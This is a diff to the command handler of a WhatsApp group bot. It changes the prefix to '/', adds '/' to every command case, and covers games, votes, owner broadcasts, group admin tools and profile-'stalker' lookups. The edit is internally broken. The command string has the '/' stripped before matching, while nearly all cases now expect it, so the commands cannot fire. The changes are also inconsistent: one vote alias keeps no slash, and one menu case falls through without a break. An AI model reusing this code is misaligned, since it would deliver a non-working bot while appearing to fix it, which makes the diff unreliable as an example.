@@ -81,15 +81,16 @@ try {
         const { type, quotedMsg, mentioned, now, fromMe } = m
         const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
         const budy = (typeof m.text == 'string' ? m.text : '')
-        const prefix = '.'
+        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "/" : prefa ?? global.prefixo
+        const prefixo = '/';
         const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
         const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
         const messagesC = pes.slice(0).trim()
         const content = JSON.stringify(m.message)
-        const isCmd = body.startsWith(prefix)
+        const isCmd = body.startsWith(prefixo)
         const from = jidNormalizedUser(m.key.remoteJid || m.key.participant)
         const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
-        const command = body.replace(prefix).trim().split(/ +/).shift().toLowerCase()
+        const command = body.replace(prefixo,'').trim().split(/ +/).shift().toLowerCase()
         const args = body.trim().split(/ +/).slice(1)
         const pushname = m.pushName || "No Name"
         const botNumber = await client.decodeJid(client.user.id)
@@ -293,7 +294,7 @@ if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 
             if (budy.toLowerCase() == jawaban) {
 
-                await m.reply(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
+                await m.reply(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefixo}math mode`)
 
                 delete kuismath[m.sender.split('@')[0]]
 
@@ -1349,7 +1350,7 @@ client.ev.emit('messages.upsert', msg)
 }
 
 switch (command) {
-case 'ttc': case 'ttt': case 'tictactoe': {
+case '/ttc': case '/ttt': case '/tictactoe': {
             let TicTacToe = require("./lib/tictactoe")
             this.game = this.game ? this.game : {}
             if (Object.values(this.game).find(room13 => room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender))) return replygcZero(`You Are Still In The Game`)
@@ -1393,12 +1394,12 @@ Type *surrender* to surrender and admit defeat`
             state: 'WAITING'
             }
             if (text) room13.name = text
-            replygcZero('Waiting For Partner' + (text ? ` Type The Command Below ${prefix}${command} ${text}` : ''))
+            replygcZero('Waiting For Partner' + (text ? ` Type The Command Below ${prefixo}${command} ${text}` : ''))
             this.game[room13.id] = room13
             }
             }
             break
-            case 'delttc': case 'delttt': {
+            case '/delttc': case '/delttt': {
             this.game = this.game ? this.game : {}
             try {
             if (this.game) {
@@ -1412,14 +1413,14 @@ Type *surrender* to surrender and admit defeat`
             }
             }
             break
-            case 'suitpvp':case 'rps': case 'rockpaperscissors':case 'suit': {
+            case '/suitpvp':case '/rps': case '/rockpaperscissors':case '/suit': {
             this.suit = this.suit ? this.suit : {}
             let poin = 10
             let poin_lose = 10
             let timeout = 60000
             if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcZero(`Complete your previous game`)
 	    if (m.mentionedJid[0] === m.sender) return replygcZero(`Can't play with myself !`)
-            if (!m.mentionedJid[0]) return replygcZero(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
+            if (!m.mentionedJid[0]) return replygcZero(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefixo}suit @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
             if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcZero(`The person you are challenging is playing suit with someone else :(`)
             let id = 'suit_' + new Date() * 1
             let caption = `_*SUIT PvP*_
@@ -1440,25 +1441,25 @@ Type *surrender* to surrender and admit defeat`
             }
             }
             break
-	case 'public': {
+	case '/public': {
                 if (!ZeroTheCreator) return ZeroStickOwner()
                 client.public = true
                 replygcZero('*Successful in Changing To Public Usage*')
             }
             break
-            case 'self': {
+            case '/self': {
                 if (!ZeroTheCreator) return ZeroStickOwner()
                 client.public = false
                 replygcZero('*Successful in Changing To Self Usage*')
             }
             break
-case 'rentbot': {
+case '/rentbot': {
 if (m.isGroup) return ZeroStickPrivate()
 
 rentfromZero(client, m, from)
 }
 break
-case 'rentbotlist': 
+case '/rentbotlist': 
 try {
 let user = [... new Set([...global.conns.filter(client => client.user).map(client => client.user)])]
 te = "*Rentbot List*\n\n"
@@ -1472,13 +1473,13 @@ client.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
 replygcZero(`There are no users who have rented the bot yet`)
 }
 break
-case 'shutdown':
+case '/shutdown':
 if (!ZeroTheCreator) return ZeroStickOwner()
 replygcZero(`Ba bye...`)
 await sleep(3000)
 process.exit()
 break
-case 'owner': {
+case '/owner': {
 const repf = await client.sendMessage(from, { 
 contacts: { 
 displayName: `${list.length} Contact`, 
@@ -1486,7 +1487,7 @@ contacts: list }, mentions: [sender] }, { quoted: m })
 client.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
 }
 break
-case 'alive': case 'panel': case 'list': case 'menu': case 'help': case '?': {
+case '/alive': case '/panel': case '/list': case '/menu': case '/help': case '/?': {
 	        let ownernya = ownernomer + '@s.whatsapp.net'
             let me = m.sender
             let timestampe = speed()
@@ -1553,10 +1554,10 @@ mentionedJid:[sender],
 }, { quoted: m })
            }
            break
-           case 'allmenu': {
+           case '/allmenu': {
             var unicorn = await getBuffer(picak+'allmenu')
             sendZeroBotIncMessage(from, { 
-            text: `Hi @${sender.split("@")[0]}\n\n${allmenu(prefix)}`,
+            text: `Hi @${sender.split("@")[0]}\n\n${allmenu(prefixo)}`,
             mentions:[sender],
             contextInfo:{
             mentionedJid:[sender],
@@ -1574,10 +1575,10 @@ mentionedJid:[sender],
             })
             }
             break
-case 'ownermenu': {
+case '/ownermenu': {
 var unicorn = await getBuffer(picak+'Owner Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${ownermenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${ownermenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1595,10 +1596,10 @@ mentionedJid:[sender],
 })
 }
 break
-case 'othermenu': {
+case '/othermenu': {
 	var unicorn = await getBuffer(picak+'Other Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${othermenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${othermenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1616,10 +1617,10 @@ mentionedJid:[sender],
 })
 }
 break
-case 'downloadmenu': {
+case '/downloadmenu': {
 var unicorn = await getBuffer(picak+'Download Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${downloadmenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${downloadmenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1637,10 +1638,10 @@ mentionedJid:[sender],
 })
 }
 break
-case 'groupmenu': {
+case '/groupmenu': {
 var unicorn = await getBuffer(picak+'Group Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${groupmenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${groupmenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1658,10 +1659,10 @@ mentionedJid:[sender],
 })
 }
 break
-case 'funmenu': {
+case '/funmenu': {
 var unicorn = await getBuffer(picak+'Fun Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${funmenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${funmenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1679,10 +1680,10 @@ mentionedJid:[sender],
 })
 }
 break
-case 'stalkermenu': {
+case '/stalkermenu': {
 var unicorn = await getBuffer(picak+'Stalker Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${stalkermenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${stalkermenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1701,10 +1702,10 @@ mentionedJid:[sender],
 }
 
 
-case 'textpromenu': {
+case '/textpromenu': {
 var unicorn = await getBuffer(picak+'Textpro Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${textpromenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${textpromenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1722,10 +1723,10 @@ mentionedJid:[sender],
 })
 }
 break
-case 'photooxymenu': {
+case '/photooxymenu': {
 var unicorn = await getBuffer(picak+'Photooxy Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${photooxymenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${photooxymenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1743,10 +1744,10 @@ mentionedJid:[sender],
 })
 }
 break
-case 'ephoto360menu': {
+case '/ephoto360menu': {
 var unicorn = await getBuffer(picak+'Photo360 Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${ephoto360menu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${ephoto360menu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1764,10 +1765,10 @@ mentionedJid:[sender],
 })
 }
 break
-case 'animemenu': {
+case '/animemenu': {
 var unicorn = await getBuffer(picak+'Anime Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${animemenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${animemenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1785,10 +1786,10 @@ mentionedJid:[sender],
 })
 }
 break
-case 'stickermenu': {
+case '/stickermenu': {
 var unicorn = await getBuffer(picak+'Sticker Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${stickermenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${stickermenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1806,10 +1807,10 @@ mentionedJid:[sender],
 })
 }
 break
-case 'databasemenu': {
+case '/databasemenu': {
 var unicorn = await getBuffer(picak+'Database Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${databasemenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${databasemenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1827,10 +1828,10 @@ mentionedJid:[sender],
 })
 }
 break
-case 'aimenu': {
+case '/aimenu': {
 var unicorn = await getBuffer(picak+'OpenAI Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${aimenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${aimenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1848,10 +1849,10 @@ mentionedJid:[sender],
 })
 }
 break
-case 'bugmenu': {
+case '/bugmenu': {
 var unicorn = await getBuffer(picak+'Bug Menu')
 sendZeroBotIncMessage(from, { 
-text: `Hi @${sender.split("@")[0]}\n\n${bugmenu(prefix)}`,
+text: `Hi @${sender.split("@")[0]}\n\n${bugmenu(prefixo)}`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1870,8 +1871,8 @@ mentionedJid:[sender],
 }
 break
 
-case 'friend':
-case 'searchfriend':{
+case '/friend':
+case '/searchfriend':{
 
 let teman = pickRandom(Zeroverifieduser)
 setTimeout(() => {
@@ -1885,7 +1886,7 @@ client.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman
 }, 9000)
 }
 break
-case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
+case '/sc': case '/script': case '/donate': case '/donate': case '/cekupdate': case '/updatebot': case '/cekbot': case '/sourcecode': {
 me = m.sender
 teks = `*「  ${global.botname} Script 」*\n\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nDont forget to donate yeah🍜 👇 Contact Owner to donate`
 sendZeroBotIncMessage(from, { 
@@ -1909,9 +1910,9 @@ mentionedJid:[sender],
 })
 }
 break
-case 'request': case 'reportbug': {
+case '/request': case '/reportbug': {
 	if (!text) return replygcZero(`Example : ${
-        prefix + command
+        prefixo + command
       } hi dev play command is not working`)
             textt = `*| REQUEST/BUG |*`
             teks1 = `\n\n*User* : @${
@@ -1935,9 +1936,9 @@ case 'request': case 'reportbug': {
 
         }
         break
-case 'igstalk2':{
+case '/igstalk2':{
 
-if (!q) return replygcZero(`Example ${prefix+command} unicorn_Zero`)
+if (!q) return replygcZero(`Example ${prefixo+command} unicorn_Zero`)
 ZeroStickWait()
 const aj = await igstalk(`${q}`)
 client.sendMessage(from, { image: { url : aj.profile }, caption: 
@@ -1951,9 +1952,9 @@ Following : ${aj.following}
 Bio : ${aj.bio}` }, { quoted: m } )
 }
 break
-case 'ffstalk':{
+case '/ffstalk':{
 
-if (!q) return replygcZero(`Example ${prefix+command} 946716486`)
+if (!q) return replygcZero(`Example ${prefixo+command} 946716486`)
 ZeroStickWait()
 eeh = await ffstalk.ffstalk(`${q}`)
 replygcZero(`*/ Free Fire Stalker \\*
@@ -1962,9 +1963,9 @@ Id : ${eeh.id}
 Nickname : ${eeh.nickname}`)
 }
 break
-case 'mlstalk': {
+case '/mlstalk': {
 
-if (!q) return replygcZero(`Example ${prefix+command} 530793138|8129`)
+if (!q) return replygcZero(`Example ${prefixo+command} 530793138|8129`)
 ZeroStickWait()
 let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
 replygcZero(`*/ Mobile Legend Stalker \\*
@@ -1974,8 +1975,8 @@ Id : ${q.split("|")[0]}
 ID Zone: ${q.split("|")[1]}`)
 }
 break
-case 'npmstalk':{
-if (!q) return replygcZero(`Example ${prefix+command} Zeroapi`)
+case '/npmstalk':{
+if (!q) return replygcZero(`Example ${prefixo+command} Zeroapi`)
 ZeroStickWait()
 eha = await npmstalk.npmstalk(q)
 replygcZero(`*/ Npm Stalker \\*
@@ -1990,8 +1991,8 @@ Publish Time : ${eha.publishTime}
 Latest Publish Time : ${eha.latestPublishTime}`)
 }
 break
-case 'ghstalk': case 'githubstalk':{
-if (!q) return replygcZero(`Example ${prefix+command} DGXeon`)
+case '/ghstalk': case '/githubstalk':{
+if (!q) return replygcZero(`Example ${prefixo+command} DGXeon`)
 ZeroStickWait()
 aj = await githubstalk.githubstalk(`${q}`)
 client.sendMessage(from, { image: { url : aj.profile_pic }, caption: 
@@ -2018,28 +2019,28 @@ Created At : ${aj.ceated_at}
 Updated At : ${aj.updated_at}` }, { quoted: m } )
 }
 break
-case 'ss': case 'ssweb': {
-if (!q) return replygcZero(`Example ${prefix+command} link`)
+case '/ss': case '/ssweb': {
+if (!q) return replygcZero(`Example ${prefixo+command} link`)
 ZeroStickWait()
 let krt = await scp1.ssweb(q)
 client.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
 }
 break
-case 'join': {
+case '/join': {
 if (!ZeroTheCreator) return ZeroStickOwner()
-if (!text) return replygcZero(`Contoh ${prefix+command} linkgc`)
+if (!text) return replygcZero(`Contoh ${prefixo+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcZero('Link Invalid!')
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 await client.groupAcceptInvite(result)
 await replygcZero(`Done`)
 }
 break
-case 'poll': {
+case '/poll': {
 	if (!ZeroTheCreator) return ZeroStickOwner()
             let [poll, opt] = text.split("|")
             if (text.split("|") < 2)
                 return await replygcZero(
-                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Zero,Cheems,Doge...`
+                    `Mention question and atleast 2 options\nExample: ${prefixo}poll Who is best admin?|Zero,Cheems,Doge...`
                 )
             let options = []
             for (let i of opt.split(',')) {
@@ -2053,11 +2054,11 @@ case 'poll': {
             })
         }
         break
-        case 'vote': {
+        case '/vote': {
             if (!m.isGroup) return ZeroStickGroup()
-            if (m.chat in vote) return replygcZero(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
-            if (!text) return replygcZero(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
-            replygcZero(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
+            if (m.chat in vote) return replygcZero(`_There are still votes in this chat!_\n\n*${prefixo}deletevote* - to delete votes`)
+            if (!text) return replygcZero(`Enter Reason for Vote, Example: *${prefixo + command} Handsome Owner*`)
+            replygcZero(`Voting starts!\n\n*${prefixo}upvote* - for upvote\n*${prefixo}downvote* - for downvote\n*${prefixo}checkvote* - to check the vote\n*${prefixo}deletevote* - to delete vote`)
             vote[m.chat] = [q, [], []]
             await sleep(1000)
             upvote = vote[m.chat][1]
@@ -2081,15 +2082,15 @@ case 'poll': {
 └────
 
 Please Type Below
-*${prefix}upvote* - to cast vote
-*${prefix}downvote* -  to downvote
-*${prefix}deletevote* - to delete vote`
+*${prefixo}upvote* - to cast vote
+*${prefixo}downvote* -  to downvote
+*${prefixo}deletevote* - to delete vote`
             client.sendMessage(from, {text: teks_vote}, {quoted:m})
 	    }
             break
-               case 'upvote': {
+               case '/upvote': {
             if (!m.isGroup) return ZeroStickGroup()
-            if (!(m.chat in vote)) return replygcZero(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
+            if (!(m.chat in vote)) return replygcZero(`_*no voting in this group!*_\n\n*${prefixo}vote* - to start voting`)
             isVote = vote[m.chat][1].concat(vote[m.chat][2])
             wasVote = isVote.includes(m.sender)
             if (wasVote) return replygcZero('You have Voted')
@@ -2114,15 +2115,15 @@ ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 └────
 
 Please Type Below
-*${prefix}upvote* - to upvote
-*${prefix}downvote* -  to downvote
-*${prefix}deletevote* - to delete vote`
+*${prefixo}upvote* - to upvote
+*${prefixo}downvote* -  to downvote
+*${prefixo}deletevote* - to delete vote`
             client.sendMessage(from, {text: teks_vote, mentions: menvote}, {quoted:m})
 	    }
              break
-                case 'downvote': {
+                case '/downvote': {
             if (!m.isGroup) return ZeroStickGroup()
-            if (!(m.chat in vote)) return replygcZero(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
+            if (!(m.chat in vote)) return replygcZero(`_*no voting in this group!*_\n\n*${prefixo}vote* - to start voting`)
             isVote = vote[m.chat][1].concat(vote[m.chat][2])
             wasVote = isVote.includes(m.sender)
             if (wasVote) return replygcZero('You have Voted')
@@ -2147,16 +2148,16 @@ ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 └────
 
 Please Type Below
-*${prefix}upvote* - to upvote
-*${prefix}downvote* -  to downvote
-*${prefix}deletevote* - to delete vote`
+*${prefixo}upvote* - to upvote
+*${prefixo}downvote* -  to downvote
+*${prefixo}deletevote* - to delete vote`
             client.sendMessage(from, {text: teks_vote, mentions: menvote}, {quoted:m})
 	}
             break
                  
-case 'checkvote':
+case '/checkvote':
 if (!m.isGroup) return ZeroStickGroup()
-if (!(m.chat in vote)) return replygcZero(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
+if (!(m.chat in vote)) return replygcZero(`_*no voting in this group!*_\n\n*${prefixo}vote* - to start voting`)
 teks_vote = `* VOTE *
 
 *Reason:* ${vote[m.chat][0]}
@@ -2175,21 +2176,21 @@ ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 │ 
 └────
 
-*${prefix}deletevote* - to delete votes
+*${prefixo}deletevote* - to delete votes
 
 
 ©${client.user.id}
 `
 client.sendTextWithMentions(m.chat, teks_vote, m)
 break
-		case 'deletevote': case'delvote': case 'hapusvote': {
+		case '/deletevote': case'delvote': case '/hapusvote': {
             if (!m.isGroup) return ZeroStickGroup()
-            if (!(m.chat in vote)) return replygcZero(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
+            if (!(m.chat in vote)) return replygcZero(`_*no voting in this group!*_\n\n*${prefixo}vote* - to start voting`)
             delete vote[m.chat]
             replygcZero('Successfully Deleted Vote Session In This Group')
 	    }
             break
-case 'toonce': case 'toviewonce': { 
+case '/toonce': case '/toviewonce': { 
 if (!quoted) return replygcZero(`Reply Image/Video`)
 ZeroStickWait()
 if (/image/.test(mime)) {
@@ -2201,14 +2202,14 @@ client.sendMessage(from, {video: {url:anuanuan}, caption: `Here you go!`, fileLe
 }
 }
 break
-case 'fliptext': {
-if (args.length < 1) return replygcZero(`Example:\n${prefix}fliptext ${ownername}`)
+case '/fliptext': {
+if (args.length < 1) return replygcZero(`Example:\n${prefixo}fliptext ${ownername}`)
 quere = args.join(" ")
 flipe = quere.split('').reverse().join('')
 replygcZero(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
 }
 break
-            case 'listpc': {
+            case '/listpc': {
                  let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                  let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                  for (let i of anulistp) {
@@ -2218,7 +2219,7 @@ break
                  client.sendTextWithMentions(m.chat, teks, m)
              }
              break
-                case 'listgc': {
+                case '/listgc': {
                  let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                  let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                  for (let i of anulistg) {
@@ -2228,7 +2229,7 @@ break
                  client.sendTextWithMentions(m.chat, teks, m)
              }
              break
-             case 'ping': case 'botstatus': case 'statusbot': case 'p': {
+             case '/ping': case '/botstatus': case '/statusbot': case '/p': {
                 const used = process.memoryUsage()
                 const cpus = os.cpus().map(cpu => {
                     cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
@@ -2275,7 +2276,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 replygcZero(respon)
             }
             break
-            case 'bctext': case 'broadcasttext': case 'broadcast': {
+            case '/bctext': case '/broadcasttext': case '/broadcast': {
 			    if (!ZeroTheCreator) return ZeroStickOwner()
 		            if (!q) return replygcZero(`Enter text`)
 		                            const data = await store.chats.all()
@@ -2285,7 +2286,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             }
                             }
                             break
-                            case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
+                            case '/broadcastimage': case '/bcimage': case '/broadcastvideo': case '/broadcastvid':
 if(!ZeroTheCreator) return ZeroStickOwner()
         if (!q) return replygcZero(`Enter text`)
         let getGroups = await client.groupFetchAllParticipating()
@@ -2305,49 +2306,49 @@ await client.sendMessage(i, { video:media,  caption: txt, mentions:participants.
             }
         replygcZero(`Successfuly Broadcasted in ${Zerocast.length} Groups`)      
         break
-case 'block': case 'ban': {
+case '/block': case '/ban': {
 		if (!ZeroTheCreator) return ZeroStickOwner()
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 		await client.updateBlockStatus(users, 'block')
 		await replygcZero(`Done`)
 	}
 	break
-        case 'unblock': case 'unban': {
+        case '/unblock': case '/unban': {
 		if (!ZeroTheCreator) return ZeroStickOwner()
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 		await client.updateBlockStatus(users, 'unblock')
 		await replygcZero(`Done`)
 	}
 	break
-case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
+case '/listblock': case '/listban': case '/blocklist': case '/banlist': {
 	const lisben = "Total Block: " + banUser.length
 	replygcZero(lisben)
 	}
 	break
-case 'afk': {
+case '/afk': {
 if (!m.isGroup) return ZeroStickGroup()
-if (!text) return replygcZero(`Example ${prefix+command} want to sleep`)
+if (!text) return replygcZero(`Example ${prefixo+command} want to sleep`)
 let user = global.db.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = args.join(" ")
 replygcZero(`${m.pushName} Has Gone AFK\nReason : ${args.join(" ") ? args.join(" ") : ''}`)
 }
 break
-case 'resetlinkgc':
-case 'resetlinkgroup':
-case 'resetlinkgrup':
-case 'revoke':
-case 'resetlink':
-case 'resetgrouplink':
-case 'resetgclink':
-case 'resetgruplink': {
+case '/resetlinkgc':
+case '/resetlinkgroup':
+case '/resetlinkgrup':
+case '/revoke':
+case '/resetlink':
+case '/resetgrouplink':
+case '/resetgclink':
+case '/resetgruplink': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 client.groupRevokeInvite(m.chat)
 }
 break
-            case 'react': {
+            case '/react': {
                 if (!ZeroTheCreator) return ZeroStickOwner()
                 reactionMessage = {
                     react: {
@@ -2358,7 +2359,7 @@ break
                 client.sendMessage(from, reactionMessage)
             }
             break
-case 'group': case 'editinfo': {
+case '/group': case '/editinfo': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 if (!isBotAdmins) return ZeroStickBotAdmin()
@@ -2373,8 +2374,8 @@ replygcZero(`Success Allows All Participants To Send Messages To This Group`)
 replygcZero(`Type Command ${command} _pptions_\nOptions : Close & Open\nExample : ${command} close`)
 }}
 break
-case 'autostickergc':
-            case 'autosticker':
+case '/autostickergc':
+            case '/autosticker':
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
 if (args.length < 1) return replygcZero('type auto sticker on to enable\ntype auto sticker off to disable')
 if (args[0]  === 'on'){
@@ -2389,7 +2390,7 @@ fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
 replygcZero('auto sticker deactivated')
 }
 break
-case 'antivirus': case 'antivirtex': {
+case '/antivirus': case '/antivirtex': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2412,11 +2413,11 @@ ntvirtex.splice(off, 1)
 fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
 replygcZero('Success in turning off antivirus this group')
 } else {
-  await replygcZero(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
   }
   }
   break
-case 'nsfw': {
+case '/nsfw': {
 if (!m.isGroup) return ZeroStickGroup()
 if (!isBotAdmins) return ZeroStickBotAdmin()
 if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
@@ -2439,11 +2440,11 @@ ntnsfw.splice(off, 1)
 fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
 replygcZero('Success in turning off nsfw in this group')
 } else {
